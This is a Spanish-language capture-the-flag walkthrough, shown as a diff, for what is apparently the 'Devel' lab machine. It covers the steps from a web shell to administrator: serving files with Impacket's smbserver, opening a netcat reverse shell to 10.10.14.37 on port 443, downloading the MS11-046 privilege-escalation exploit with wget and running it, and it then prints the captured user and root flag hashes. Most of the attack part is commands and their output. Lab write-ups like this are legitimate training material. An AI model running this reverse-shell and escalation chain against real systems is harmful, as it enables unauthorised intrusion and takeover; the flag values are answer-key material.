+	Muestra una ventana de comandos, probar:
+	whoami --> iis apppool\web		(usuario web limitado)
+	
+	Buscar en nuestro sistema operativo el fichero smbserver.py
+	locate smbserver.py
+	Estando en el directorio donde están todos los ficheros que estamos subiendo.
+	cp /usr/share/doc/python3-impacket/examples/smbserver.py .
+	
+	Ejecutamos el servidor smb. python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
+	Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+	[*] Config file parsed
+	[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+	[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+	[*] Config file parsed
+	[*] Config file parsed
+	[*] Config file parsed
+
+	En el navegador dentro de la ventana que inicia con cmd.aspx, escribr:
+	\\10.10.14.37\share\nc.exe -e cmd.exe 10.10.14.37 443
+	En otra ventana ejecutar nc -lnvp 443  para abrir la shell remota.
+	c:\windows\system32\inetsrv>
+
+	Ejecutar un exploit para elevar privilegios con la vulnerabilidad MS11-046
+	Descargar el exploit desde la web:
+	https://github.com/abatchy17/WindowsExploits
+	Descargar el fichero ms11-046.exe
+	wget https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/MS11-046.exe
+	
+	En la consola de Devel que hemos de conseguir, copiar el fichero MS11-046.exe
+	c:\windows\system32\inetsrv>\\10.10.14.37\share\MS11-046.exe
+
+	Conseguimos una consola como admisnistrador.
+	c:\windows\system32>
+	
+	
+
++++++ FASE DE POSTEXPLOTACION ++++++++++++++++++++++++++++++++++++
+
+FLAG ADMINISTRADOR/ROOT
+c:\Users\Administrator\Desktop>more root.txt.txt
+more root.txt.txt
+e621a0b5041708797c4fc4728bc72b4b
+
+FLAG USUARIO/User
+c:\Users\babis\Desktop>more user.txt.txt
+more user.txt.txt
+9ecdd6a3aedf24b41562fea70f4cb3e8
+
